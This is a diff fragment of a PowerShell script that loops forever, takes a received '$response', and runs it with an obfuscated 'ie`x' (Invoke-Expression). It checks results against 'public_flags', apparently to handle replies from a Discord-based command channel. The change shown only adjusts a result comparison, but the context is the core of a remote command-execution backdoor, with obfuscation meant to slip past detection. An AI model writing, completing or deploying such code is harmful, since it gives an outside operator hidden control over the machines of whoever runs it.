@@ -519,7 +519,7 @@ while($true){
         }
         elseif (!($response -match "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
-            if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -match "                                           ")){
+            if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")){
                 $previouscmd = $response
             }
             else{
